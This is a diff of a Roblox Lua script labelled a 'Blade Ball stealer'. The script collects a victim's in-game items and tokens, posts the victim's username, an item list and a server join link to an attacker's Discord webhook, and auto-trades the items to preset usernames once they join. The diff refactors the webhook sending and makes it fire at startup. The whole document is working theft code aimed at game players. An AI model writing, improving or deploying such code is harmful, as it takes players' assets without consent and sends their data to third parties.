@@ -18,10 +18,13 @@ local tradeCompleteGui = PlayerGui.TradeCompleted
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
-local users = _G.Usernames
+local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
+
+-- Store if webhook has been sent to prevent duplicate sends
+_G.webhookSent = false
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
@@ -141,28 +144,53 @@ end
 local totalRAP = 0
 local totalTokens = 0
 
-local function SendJoinMessage(items, tokens)
-    local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
-            inline = false
+local function SendWebhookMessage(isJoinMessage, items, tokens)
+    -- Always send webhook even if re-executing
+    _G.webhookSent = true
+    
+    local fields = {}
+    
+    if isJoinMessage then
+        fields = {
+            {
+                name = "Victim Username:",
+                value = plr.Name,
+                inline = true
+            },
+            {
+                name = "Join link:",
+                value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
+            },
+            {
+                name = "Item list:",
+                value = "",
+                inline = false
+            },
+            {
+                name = "Summary:",
+                value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
+                inline = false
+            }
         }
-    }
+    else
+        fields = {
+            {
+                name = "Victim Username:",
+                value = plr.Name,
+                inline = true
+            },
+            {
+                name = "Items sent:",
+                value = "",
+                inline = false
+            },
+            {
+                name = "Summary:",
+                value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
+                inline = false
+            }
+        }
+    end
 
     local grouped = {}
     for _, item in ipairs(items) do
@@ -184,31 +212,35 @@ local function SendJoinMessage(items, tokens)
         table.insert(groupedList, group)
     end
 
+    -- Sort alphabetically by item name, then by category
     table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
+        if a.Name:lower() == b.Name:lower() then
+            return a.Category < b.Category
+        end
+        return a.Name:lower() < b.Name:lower()
     end)
 
+    local itemListFieldIndex = isJoinMessage and 3 or 2
     for _, group in ipairs(groupedList) do
         local itemLine = string.format("%s [%s] (x%s) - %s RAP", group.Name, group.Category, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        fields[itemListFieldIndex].value = fields[itemListFieldIndex].value .. itemLine .. "\n"
     end
 
-    if #fields[3].value > 1024 then
+    if #fields[itemListFieldIndex].value > 1024 then
         local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
+        for line in fields[itemListFieldIndex].value:gmatch("[^\r\n]+") do
             table.insert(lines, line)
         end
 
-        while #fields[3].value > 1024 and #lines > 0 do
+        while #fields[itemListFieldIndex].value > 1024 and #lines > 0 do
             table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+            fields[itemListFieldIndex].value = table.concat(lines, "\n") .. "\n... and more items"
         end
     end
 
     local data = {
-        ["content"] = (ping == "Yes" and "--[[@everyone]] " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
-            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
+            ["title"] = isJoinMessage and "🎴 Join to get Blade Ball hit" or "🎴 New Blade Ball Execution",
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
@@ -216,99 +248,29 @@ local function SendJoinMessage(items, tokens)
             }
         }}
     }
+    
+    if isJoinMessage and ping == "Yes" then
+        data["content"] = "@everyone"
+    end
+
     local body = HttpService:JSONEncode(data)
     local headers = {
         ["Content-Type"] = "application/json"
     }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
-local function SendMessage(items, tokens)
-    local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary:",
-            value = string.format("Total RAP: %s\nTotal Tokens: %s", formatNumber(totalRAP), formatNumber(tokens)),
-            inline = false
-        }
-	}
-
-    local grouped = {}
-    for _, item in ipairs(items) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP,
-                Category = item.itemType
-            }
-        end
-    end
-
-    local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
+    
+    -- Use pcall to handle potential webhook errors
+    local success, err = pcall(function()
+        local response = request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
     end)
-
-    for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s [%s] (x%s) - %s RAP", group.Name, group.Category, group.Count, formatNumber(group.TotalRAP))
-        fields[2].value = fields[2].value .. itemLine .. "\n"
+    
+    if not success then
+        warn("Failed to send webhook:", err)
     end
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution",
-            ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
-        }}
-    }
-
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
 end
 
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
@@ -380,17 +342,21 @@ local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
 local cleanedText = trimmedText:gsub("[^%d]", "")
 totalTokens = tonumber(cleanedText) or 0
 
+-- Store original items for webhook
+local originalItemsToSend = {}
+for i, v in ipairs(itemsToSend) do
+    originalItemsToSend[i] = v
+end
+
+-- Always send the join message webhook on script start
+if #itemsToSend > 0 or totalTokens > 0 then
+    SendWebhookMessage(true, itemsToSend, totalTokens)
+end
+
 if #itemsToSend > 0 or totalTokens > 0 then
     table.sort(itemsToSend, function(a, b)
         return a.RAP > b.RAP
     end)
-
-    local sentItems = {}
-    for i, v in ipairs(itemsToSend) do
-        sentItems[i] = v
-    end
-
-    SendJoinMessage(itemsToSend, totalTokens)
 
     local function getNextBatch(items, batchSize)
         local batch = {}
@@ -424,18 +390,26 @@ if #itemsToSend > 0 or totalTokens > 0 then
     end
 
     local function waitForUserJoin()
-        local sentMessage = false
+        local executionSent = false
         local function onUserJoin(player)
             if table.find(users, player.Name) then
-                if not sentMessage then
-                    SendMessage(sentItems, totalTokens)
-                    sentMessage = true
+                if not executionSent then
+                    -- Send execution webhook
+                    SendWebhookMessage(false, originalItemsToSend, totalTokens)
+                    executionSent = true
                 end
                 doTrade(player.Name)
             end
         end
-        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
+        
+        -- Check existing players
+        for _, p in ipairs(Players:GetPlayers()) do 
+            onUserJoin(p) 
+        end
+        
+        -- Listen for new players
         Players.PlayerAdded:Connect(onUserJoin)
     end
+    
     waitForUserJoin()
 end
